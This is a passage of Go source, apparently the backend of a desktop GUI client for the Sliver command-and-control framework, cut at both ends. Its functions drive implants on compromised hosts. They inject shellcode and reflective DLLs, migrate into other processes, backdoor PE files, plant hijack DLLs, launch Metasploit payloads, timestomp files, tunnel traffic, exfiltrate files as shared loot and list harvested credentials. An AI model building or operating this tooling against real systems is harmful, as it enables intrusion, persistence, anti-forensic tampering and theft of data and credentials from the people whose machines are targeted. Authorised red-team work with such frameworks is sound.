func (a *App) RemoveFile(sessionID, path string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Rm(a.ctx, &sliverpb.RmReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── File Transfers ──────────────────────────────────────────────────────────

type TransferResult struct {
	Path  string `json:"path"`
	Bytes int64  `json:"bytes"`
	Error string `json:"error,omitempty"`
}

func (a *App) DownloadFile(sessionID, remotePath string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.Download(a.ctx, &sliverpb.DownloadReq{
		Path:             remotePath,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	data, err := decodeDownload(resp)
	if err != nil {
		return TransferResult{Error: "decode: " + err.Error()}
	}
	savePath, err := a.safeSaveFileDialog(runtime.SaveDialogOptions{
		DefaultFilename: filepath.Base(remotePath),
		Title:           "Save downloaded file",
	})
	if err != nil || savePath == "" {
		return TransferResult{Error: "save cancelled"}
	}
	if err := os.WriteFile(savePath, data, 0644); err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: savePath, Bytes: int64(len(data))}
}

// decodeDownload returns the file bytes from a Download response, transparently
// gunzipping when the implant gzip-encoded the payload (resp.Encoder == "gzip").
func decodeDownload(resp *sliverpb.Download) ([]byte, error) {
	if resp.Encoder == "gzip" {
		gz, err := gzip.NewReader(bytes.NewReader(resp.Data))
		if err != nil {
			return nil, err
		}
		defer gz.Close()
		return io.ReadAll(gz)
	}
	return resp.Data, nil
}

func (a *App) UploadFile(sessionID, remotePath string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	localPath, err := a.safeOpenFileDialog(runtime.OpenDialogOptions{
		Title: "Select file to upload",
	})
	if err != nil || localPath == "" {
		return TransferResult{Error: "upload cancelled"}
	}
	data, err := os.ReadFile(localPath)
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	target := remotePath
	if target == "" {
		target = filepath.Base(localPath)
	}
	_, err = client.RPC.Upload(a.ctx, &sliverpb.UploadReq{
		Path:    target,
		Data:    data,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: target, Bytes: int64(len(data))}
}

// UploadFileFrom uploads a specific local file (on the operator machine) to a
// remote path - CLI-style `upload <local> <remote>`, no file dialog.
func (a *App) UploadFileFrom(sessionID, localPath, remotePath string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	data, err := os.ReadFile(localPath)
	if err != nil {
		return TransferResult{Error: "read local file: " + err.Error()}
	}
	target := remotePath
	if target == "" {
		target = filepath.Base(localPath)
	}
	_, err = client.RPC.Upload(a.ctx, &sliverpb.UploadReq{
		Path:    target,
		Data:    data,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: target, Bytes: int64(len(data))}
}

// DownloadFileTo downloads a remote file straight to a local path - CLI-style
// `download <remote> <local>`, no save dialog.
func (a *App) DownloadFileTo(sessionID, remotePath, localPath string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.Download(a.ctx, &sliverpb.DownloadReq{
		Path:             remotePath,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	data, err := decodeDownload(resp)
	if err != nil {
		return TransferResult{Error: "decode: " + err.Error()}
	}
	if err := os.WriteFile(localPath, data, 0644); err != nil {
		return TransferResult{Error: "write local file: " + err.Error()}
	}
	return TransferResult{Path: localPath, Bytes: int64(len(data))}
}

// ─── Advanced execution / privilege (session) ───────────────────────────────────

// RunAs runs a program as another user (Windows).
func (a *App) RunAs(sessionID, username, domain, password, program, args string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.RunAs(a.ctx, &sliverpb.RunAsReq{
		Username:    username,
		Domain:      domain,
		Password:    password,
		ProcessName: program,
		Args:        args,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Output, nil
}

// Migrate injects the implant into another process (pid), building the payload
// from a saved implant profile's config.
func (a *App) Migrate(sessionID string, pid uint32, profileName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	cfg, err := a.profileConfig(profileName)
	if err != nil {
		return err
	}
	_, err = client.RPC.Migrate(a.ctx, &clientpb.MigrateReq{
		Pid:     pid,
		Config:  cfg,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// profileConfig fetches a saved implant profile's config by name.
func (a *App) profileConfig(name string) (*clientpb.ImplantConfig, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	profiles, err := client.RPC.ImplantProfiles(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	for _, p := range profiles.Profiles {
		if p.Name == name {
			if p.Config == nil {
				return nil, fmt.Errorf("profile %q has no config", name)
			}
			// getsystem/migrate inject SHELLCODE into a process, so rebuild a
			// fresh, complete config from the profile's core params with the
			// format forced to shellcode. This avoids stale/partial fields from
			// the DB round-trip that can produce invalid generated source.
			req := GenerateRequest{
				GOOS:   p.Config.GOOS,
				GOARCH: p.Config.GOARCH,
				Format: "shellcode",
				Debug:  p.Config.Debug,
			}
			if len(p.Config.C2) > 0 {
				req.C2URL = p.Config.C2[0].URL
			}
			if req.C2URL == "" {
				return nil, fmt.Errorf("profile %q has no C2 URL", name)
			}
			return a.buildImplantConfig(req), nil
		}
	}
	return nil, fmt.Errorf("implant profile %q not found - create one in the Profiles panel first", name)
}

// ExecuteShellcode injects shellcode (opened via a native dialog) into a process.
// pid 0 = the implant's own process.
func (a *App) ExecuteShellcode(sessionID, localPath string, pid uint32) AssemblyResult {
	client, err := a.requireClient()
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	data, err := a.readLocalOrDialog(localPath, "Select shellcode (.bin)")
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	_, err = client.RPC.Task(a.ctx, &sliverpb.TaskReq{
		Data:     data,
		Pid:      pid,
		RWXPages: true,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	return AssemblyResult{Output: "[+] shellcode injected"}
}

// SpawnDll reflectively loads a DLL (opened via a native dialog) into a process.
func (a *App) SpawnDll(sessionID, localPath, args, entryPoint string) AssemblyResult {
	client, err := a.requireClient()
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	data, err := a.readLocalOrDialog(localPath, "Select reflective DLL")
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	ep := entryPoint
	if ep == "" {
		ep = "ReflectiveLoader"
	}
	_, err = client.RPC.SpawnDll(a.ctx, &sliverpb.InvokeSpawnDllReq{
		Data:        data,
		ProcessName: "notepad.exe",
		Args:        strings.Fields(args),
		EntryPoint:  ep,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	return AssemblyResult{Output: "[+] DLL spawned"}
}

func (a *App) Chmod(sessionID, path, mode string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Chmod(a.ctx, &sliverpb.ChmodReq{
		Path:     path,
		FileMode: mode,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) Chown(sessionID, path, uid, gid string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Chown(a.ctx, &sliverpb.ChownReq{
		Path:    path,
		Uid:     uid,
		Gid:     gid,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// Chtimes timestomps a file - sets access + modified time (unix seconds).
func (a *App) Chtimes(sessionID, path string, atime, mtime int64) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Chtimes(a.ctx, &sliverpb.ChtimesReq{
		Path:    path,
		ATime:   atime,
		MTime:   mtime,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Reverse port forwarding (session) ──────────────────────────────────────────

type RportFwdView struct {
	ID      uint32 `json:"id"`
	Bind    string `json:"bind"`
	Forward string `json:"forward"`
}

func (a *App) StartRportFwd(sessionID, bindAddr string, bindPort int, fwdAddr string, fwdPort int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartRportFwdListener(a.ctx, &sliverpb.RportFwdStartListenerReq{
		BindAddress:    bindAddr,
		BindPort:       uint32(bindPort),
		ForwardAddress: fwdAddr,
		ForwardPort:    uint32(fwdPort),
		Request:        &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) ListRportFwds(sessionID string) ([]RportFwdView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetRportFwdListeners(a.ctx, &sliverpb.RportFwdListenersReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]RportFwdView, 0, len(resp.Listeners))
	for _, l := range resp.Listeners {
		out = append(out, RportFwdView{
			ID:      l.ID,
			Bind:    fmt.Sprintf("%s:%d", l.BindAddress, l.BindPort),
			Forward: fmt.Sprintf("%s:%d", l.ForwardAddress, l.ForwardPort),
		})
	}
	return out, nil
}

func (a *App) StopRportFwd(sessionID string, id uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StopRportFwdListener(a.ctx, &sliverpb.RportFwdStopListenerReq{
		ID:      id,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ReconfigureBeacon changes a live beacon's check-in interval/jitter (seconds).
// Applied on the beacon's next check-in.
func (a *App) ReconfigureBeacon(beaconID string, interval, jitter int64) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Reconfigure(a.ctx, &sliverpb.ReconfigureReq{
		BeaconInterval: interval * int64(time.Second),
		BeaconJitter:   jitter * int64(time.Second),
		Request:        &commonpb.Request{BeaconID: beaconID, Async: true},
	})
	return err
}

// InteractiveBeacon asks a beacon to open an interactive session on next check-in.
func (a *App) InteractiveBeacon(beaconID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.OpenSession(a.ctx, &sliverpb.OpenSession{
		Request: &commonpb.Request{BeaconID: beaconID, Async: true},
	})
	return err
}

// ─── Regenerate / Hosts / Creds (server) ────────────────────────────────────────

// RegenerateBuild re-downloads a previously built implant by name and saves it
// through the native save dialog. Retained for callers that want the classic
// UX, but prefer RegenerateBuildToPath from new code - native SaveFileDialog
// on Wails v2 has a history of crashing the WebView2 process on some Windows
// configs (recover() can't catch that; it's not a Go panic, it's a hard GPF
// in the OS common-dialog COM plumbing).
func (a *App) RegenerateBuild(name string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.Regenerate(a.ctx, &clientpb.RegenerateReq{ImplantName: name})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	if resp.File == nil {
		return TransferResult{Error: "no stored build for " + name}
	}
	defaultName := resp.File.Name
	if defaultName == "" {
		defaultName = name
	}
	savePath, err := a.safeSaveFileDialog(runtime.SaveDialogOptions{
		DefaultFilename: defaultName,
		Title:           "Save regenerated implant",
	})
	if err != nil || savePath == "" {
		return TransferResult{Error: "save cancelled"}
	}
	if err := os.WriteFile(savePath, resp.File.Data, 0755); err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: savePath, Bytes: int64(len(resp.File.Data))}
}

// RegenerateBuildToPath is the dialog-free variant: the caller supplies a
// destination directory (or full file path), the backend fetches the build
// and writes it there. No native SaveFileDialog is involved, so the app can't
// be killed by a Windows common-dialog crash. If destPath is a directory, the
// build's default filename is used; if it's a full file path, that name is
// honoured verbatim. Missing parent directories are created.
//
// This is the path the Generate flow's "Save to disk" and auto-save should
// prefer - the operator supplies the target once (persisted in localStorage
// on the frontend) and every subsequent build just lands, silently.
func (a *App) RegenerateBuildToPath(name, destPath string) TransferResult {
	if strings.TrimSpace(destPath) == "" {
		return TransferResult{Error: "destination path required"}
	}
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.Regenerate(a.ctx, &clientpb.RegenerateReq{ImplantName: name})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	if resp.File == nil {
		return TransferResult{Error: "no stored build for " + name}
	}
	dest := destPath
	// Treat existing directories as "save under this dir with the build's
	// default filename". Non-existent paths are treated as full file paths so
	// the operator can pin a specific name for one-off saves.
	if info, err := os.Stat(dest); err == nil && info.IsDir() {
		fn := resp.File.Name
		if fn == "" {
			fn = name
		}
		dest = filepath.Join(dest, fn)
	} else {
		// If the path ends with a separator or matches an obvious directory
		// pattern, also join the filename in - a common typo path where the
		// operator forgets the trailing name.
		if strings.HasSuffix(destPath, string(os.PathSeparator)) || strings.HasSuffix(destPath, "/") {
			fn := resp.File.Name
			if fn == "" {
				fn = name
			}
			dest = filepath.Join(destPath, fn)
		}
	}
	// Create parent dirs if the operator pointed at a not-yet-existing tree.
	if parent := filepath.Dir(dest); parent != "" {
		if err := os.MkdirAll(parent, 0o755); err != nil {
			return TransferResult{Error: "mkdir " + parent + ": " + err.Error()}
		}
	}
	if err := os.WriteFile(dest, resp.File.Data, 0o755); err != nil {
		return TransferResult{Error: err.Error()}
	}
	a.audit.log("regenerate-to-path", name, dest)
	return TransferResult{Path: dest, Bytes: int64(len(resp.File.Data))}
}

type HostView struct {
	ID        string `json:"id"`
	Hostname  string `json:"hostname"`
	OS        string `json:"os"`
	UUID      string `json:"uuid"`
	Locale    string `json:"locale"`
	FirstSeen string `json:"firstSeen"`
}

func (a *App) ListHosts() ([]HostView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Hosts(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]HostView, 0, len(resp.Hosts))
	for _, h := range resp.Hosts {
		fs := ""
		if h.FirstContact > 0 {
			fs = time.Unix(h.FirstContact, 0).Format("2006-01-02 15:04")
		}
		out = append(out, HostView{ID: h.ID, Hostname: h.Hostname, OS: h.OSVersion, UUID: h.HostUUID, Locale: h.Locale, FirstSeen: fs})
	}
	return out, nil
}

func (a *App) DeleteHost(hostID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.HostRm(a.ctx, &clientpb.Host{ID: hostID})
	return err
}

type CredView struct {
	ID       string `json:"id"`
	Username string `json:"username"`
	Plain    string `json:"plaintext"`
	Hash     string `json:"hash"`
	Cracked  bool   `json:"cracked"`
}

func (a *App) ListCreds() ([]CredView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Creds(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]CredView, 0, len(resp.Credentials))
	for _, c := range resp.Credentials {
		out = append(out, CredView{ID: c.ID, Username: c.Username, Plain: c.Plaintext, Hash: c.Hash, Cracked: c.IsCracked})
	}
	return out, nil
}

func (a *App) AddCred(username, plaintext, hash string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.CredsAdd(a.ctx, &clientpb.Credentials{
		Credentials: []*clientpb.Credential{{Username: username, Plaintext: plaintext, Hash: hash}},
	})
	return err
}

func (a *App) DeleteCred(id string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.CredsRm(a.ctx, &clientpb.Credentials{
		Credentials: []*clientpb.Credential{{ID: id}},
	})
	return err
}

// ─── Websites / Canaries (server) ───────────────────────────────────────────────

type WebsiteView struct {
	ID    string `json:"id"`
	Name  string `json:"name"`
	Paths int    `json:"paths"`
}

func (a *App) ListWebsites() ([]WebsiteView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Websites(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]WebsiteView, 0, len(resp.Websites))
	for _, w := range resp.Websites {
		out = append(out, WebsiteView{ID: w.ID, Name: w.Name, Paths: len(w.Contents)})
	}
	return out, nil
}

func (a *App) RemoveWebsite(name string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WebsiteRemove(a.ctx, &clientpb.Website{Name: name})
	return err
}

type CanaryView struct {
	Domain      string `json:"domain"`
	ImplantName string `json:"implantName"`
	Triggered   bool   `json:"triggered"`
	Count       uint32 `json:"count"`
	Latest      string `json:"latest"`
}

func (a *App) ListCanaries() ([]CanaryView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Canaries(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]CanaryView, 0, len(resp.Canaries))
	for _, c := range resp.Canaries {
		out = append(out, CanaryView{Domain: c.Domain, ImplantName: c.ImplantName, Triggered: c.Triggered, Count: c.Count, Latest: c.LatestTrigger})
	}
	return out, nil
}

// StartStagerListener starts a TCP stager listener that serves a stage built
// from a saved implant profile.
func (a *App) StartStagerListener(host string, port uint32, profileName string) (uint32, error) {
	client, err := a.requireClient()
	if err != nil {
		return 0, err
	}
	resp, err := client.RPC.StartTCPStagerListener(a.ctx, &clientpb.StagerListenerReq{
		Host:        host,
		Port:        port,
		ProfileName: profileName,
	})
	if err != nil {
		return 0, err
	}
	return resp.JobID, nil
}

// ─── Post-exploitation: backdoor / dllhijack / msf (session) ─────────────────────

// Backdoor injects an implant (from a profile) into an existing PE on the target.
func (a *App) Backdoor(sessionID, remoteFilePath, profileName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Backdoor(a.ctx, &clientpb.BackdoorReq{
		FilePath:    remoteFilePath,
		ProfileName: profileName,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// DllHijack plants a hijacking DLL at TargetLocation, cloning exports from a
// reference DLL and embedding an implant (from a profile).
func (a *App) DllHijack(sessionID, referenceDLLPath, targetLocation, profileName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.HijackDLL(a.ctx, &clientpb.DllHijackReq{
		ReferenceDLLPath: referenceDLLPath,
		TargetLocation:   targetLocation,
		ProfileName:      profileName,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// MsfInject runs a Metasploit payload in the session's own process.
func (a *App) MsfInject(sessionID, payload, lhost string, lport uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Msf(a.ctx, &clientpb.MSFReq{
		Payload: payload,
		LHost:   lhost,
		LPort:   lport,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// MsfRemoteInject runs a Metasploit payload injected into another process (pid).
func (a *App) MsfRemoteInject(sessionID, payload, lhost string, lport, pid uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.MsfRemote(a.ctx, &clientpb.MSFRemoteReq{
		Payload: payload,
		LHost:   lhost,
		LPort:   lport,
		PID:     pid,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── WireGuard tunneling (session, WG implants) ─────────────────────────────────

func (a *App) WGStartPortForward(sessionID string, localPort int, remoteAddr string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WGStartPortForward(a.ctx, &sliverpb.WGPortForwardStartReq{
		LocalPort:     int32(localPort),
		RemoteAddress: remoteAddr,
		Request:       &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) WGStopPortForward(sessionID string, id int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WGStopPortForward(a.ctx, &sliverpb.WGPortForwardStopReq{
		ID:      int32(id),
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) WGStartSocks(sessionID string, port int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WGStartSocks(a.ctx, &sliverpb.WGSocksStartReq{
		Port:    int32(port),
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) WGStopSocks(sessionID string, id int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WGStopSocks(a.ctx, &sliverpb.WGSocksStopReq{
		ID:      int32(id),
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Loot ────────────────────────────────────────────────────────────────────

type LootView struct {
	ID   string `json:"id"`
	Name string `json:"name"`
	Type string `json:"type"`
}

func (a *App) GetLoot() ([]LootView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.LootAll(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]LootView, 0, len(resp.Loot))
	for _, l := range resp.Loot {
		// clientpb.Loot has no Type/Credential field in v1.7.3 - only FileType.
		out = append(out, LootView{ID: l.ID, Name: l.Name, Type: l.FileType.String()})
	}
	return out, nil
}

func (a *App) DeleteLoot(lootID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.LootRm(a.ctx, &clientpb.Loot{ID: lootID})
	return err
}

// LootFile downloads a file from a session and saves it into the teamserver's
// shared loot store (Sliver's `download --loot`). It's now available to every
// operator on the team, and survives the session.
func (a *App) LootFile(sessionID, remotePath string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	resp, err := client.RPC.Download(a.ctx, &sliverpb.DownloadReq{
		Path:             remotePath,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.IsDir {
		return fmt.Errorf("%s is a directory - loot a single file", remotePath)
	}
	data, err := decodeDownload(resp)
	if err != nil {
		return err
	}
	base := filepath.Base(remotePath)
	// FileType must be set explicitly; the default (NO_FILE) is a placeholder
	// value that Sliver treats as "no file at all", which then shows every
	// looted file as "NO_FILE" in the loot browser and breaks the ZIP export
	// manifest. Sniff for a plausible text file (valid UTF-8 with no NULs);
	// otherwise call it binary.
	ft := clientpb.FileType_BINARY
	if isProbablyText(data) {
		ft = clientpb.FileType_TEXT
	}
	_, err = client.RPC.LootAdd(a.ctx, &clientpb.Loot{
		Name:     base,
		FileType: ft,
		File:     &commonpb.File{Name: base, Data: data},
	})
	return err
}

// isProbablyText is a cheap text-vs-binary sniff: no NUL byte within the first
// 8KB and valid UTF-8 counts as text.
func isProbablyText(data []byte) bool {
	head := data
	if len(head) > 8192 {
		head = head[:8192]
	}
	for _, b := range head {
		if b == 0 {
			return false
		}
	}
	// Not-strict UTF-8 is fine here; the goal is a good default for the loot
	// browser, not a lossless MIME detector.
	return true
}

// DownloadLoot fetches a loot item's content from the teamserver and saves it
// locally via a native dialog (Sliver's `loot fetch`).
func (a *App) DownloadLoot(lootID string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.LootContent(a.ctx, &clientpb.Loot{ID: lootID})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	if resp.File == nil {
		return TransferResult{Error: "this loot item has no file content"}
	}
	savePath, err := a.safeSaveFileDialog(runtime.SaveDialogOptions{
		DefaultFilename: resp.File.Name,
		Title:           "Save loot",
	})
	if err != nil || savePath == "" {
		return TransferResult{Error: "save cancelled"}
	}
	if err := os.WriteFile(savePath, resp.File.Data, 0644); err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: savePath, Bytes: int64(len(resp.File.Data))}
}

// ─── Build History ────────────────────────────────────────────────────────────

type BuildView struct {
	Name   string   `json:"name"`
	GOOS   string   `json:"goos"`
	GOARCH string   `json:"goarch"`
	Format string   `json:"format"`
	Debug  bool     `json:"debug"`
	C2URLs []string `json:"c2Urls"`
}

func (a *App) GetBuildHistory() ([]BuildView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.ImplantBuilds(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]BuildView, 0, len(resp.Configs))
	for name, cfg := range resp.Configs {
		urls := make([]string, 0, len(cfg.C2))
		for _, c := range cfg.C2 {
			urls = append(urls, c.URL)
		}
		out = append(out, BuildView{
			Name:   name,
			GOOS:   cfg.GOOS,
			GOARCH: cfg.GOARCH,
			Format: cfg.Format.String(),
			Debug:  cfg.Debug,
			C2URLs: urls,
		})
	}
	return out, nil
}

// DeleteBuild removes a saved implant build from the teamserver by name. Useful
// for clearing a stale record (e.g. a build that saved server-side but failed to
// download) that would otherwise trip the UNIQUE name constraint on regenerate.
func (a *App) DeleteBuild(name string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.DeleteImplantBuild(a.ctx, &clientpb.DeleteReq{Name: name})
	return err
}

// ─── Beacons ─────────────────────────────────────────────────────────────────

type BeaconView struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Hostname    string `json:"hostname"`
	Username      string `json:"username"`
	OS            string `json:"os"`
	Arch          string `json:"arch"`
	Transport     string `json:"transport"`
	RemoteAddr    string `json:"remoteAddress"`
	PID           int32  `json:"pid"`
	Interval      int64  `json:"interval"`
	Jitter        int64  `json:"jitter"`
	LastCheckin   string `json:"lastCheckin"`
	LastCheckinTs int64  `json:"lastCheckinTs"` // unix seconds - for freshness coloring on the frontend
	NextCheckin   string `json:"nextCheckin"`
	NextCheckinTs int64  `json:"nextCheckinTs"`
	IsDead        bool   `json:"isDead"`
}

func (a *App) ListBeacons() ([]BeaconView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetBeacons(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]BeaconView, 0, len(resp.Beacons))
	for _, b := range resp.Beacons {
		out = append(out, BeaconView{
			ID:            b.ID,
			Name:          b.Name,
			Hostname:      b.Hostname,
			Username:      b.Username,
			OS:            b.OS,
			Arch:          b.Arch,
			Transport:     b.Transport,
			RemoteAddr:    b.RemoteAddress,
			PID:           b.PID,
			Interval:      b.Interval,
			Jitter:        b.Jitter,
			LastCheckin:   time.Unix(b.LastCheckin, 0).Format("15:04:05"),
			LastCheckinTs: b.LastCheckin,
			NextCheckin:   time.Unix(b.NextCheckin, 0).Format("15:04:05"),
			NextCheckinTs: b.NextCheckin,
			IsDead:        b.IsDead,
		})
	}
	return out, nil
}

func (a *App) KillBeacon(beaconID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RmBeacon(a.ctx, &clientpb.Beacon{ID: beaconID})
	return err
}

// ─── Operators ────────────────────────────────────────────────────────────────

type OperatorView struct {
	Name   string `json:"name"`
	Online bool   `json:"online"`
}

func (a *App) ListOperators() ([]OperatorView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	ops, err := client.ListOperators(a.ctx)
	if err != nil {
		return nil, err
	}
	out := make([]OperatorView, 0, len(ops))
	for _, o := range ops {
		out = append(out, OperatorView{Name: o.Name, Online: o.Online})
	}
	return out, nil
}

// ─── Listeners / Jobs ─────────────────────────────────────────────────────────

type JobView struct {
	ID       uint32 `json:"id"`
	Name     string `json:"name"`
	Protocol string `json:"protocol"`
	Port     uint32 `json:"port"`
}

func (a *App) ListJobs() ([]JobView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]JobView, 0, len(resp.Active))
	for _, j := range resp.Active {
		out = append(out, JobView{ID: j.ID, Name: j.Name, Protocol: j.Protocol, Port: j.Port})
	}
	return out, nil
}

func (a *App) KillJob(jobID uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.KillJob(a.ctx, &clientpb.KillJobReq{ID: jobID})
	return err
}

type StartMTLSReq struct {
	Host string `json:"host"`
	Port uint32 `json:"port"`
}

func (a *App) StartMTLSListener(req StartMTLSReq) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartMTLSListener(a.ctx, &clientpb.MTLSListenerReq{Host: req.Host, Port: req.Port})
	return err
}

// StartHTTPReq mirrors clientpb.HTTPListenerReq fields the operator can set
// from the GUI. Zero values are safe defaults (no cert override, no OTP, etc.).
type StartHTTPReq struct {
	Domain          string `json:"domain"`
	Host            string `json:"host"`
	Port            uint32 `json:"port"`
	Secure          bool   `json:"secure"`
	Website         string `json:"website"`
	Cert            []byte `json:"cert"`
	Key             []byte `json:"key"`
	ACME            bool   `json:"acme"`
	EnforceOTP      bool   `json:"enforceOTP"`
	LongPollTimeout int64  `json:"longPollTimeout"`
	LongPollJitter  int64  `json:"longPollJitter"`
	RandomizeJARM   bool   `json:"randomizeJARM"`
}

func (a *App) StartHTTPListener(req StartHTTPReq) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	pbReq := &clientpb.HTTPListenerReq{
		Domain:          req.Domain,
		Host:            req.Host,
		Port:            req.Port,
		Secure:          req.Secure,
		Website:         req.Website,
		Cert:            req.Cert,
		Key:             req.Key,
		ACME:            req.ACME,
		EnforceOTP:      req.EnforceOTP,
		LongPollTimeout: req.LongPollTimeout,
		LongPollJitter:  req.LongPollJitter,
		RandomizeJARM:   req.RandomizeJARM,
	}
	if req.Secure {
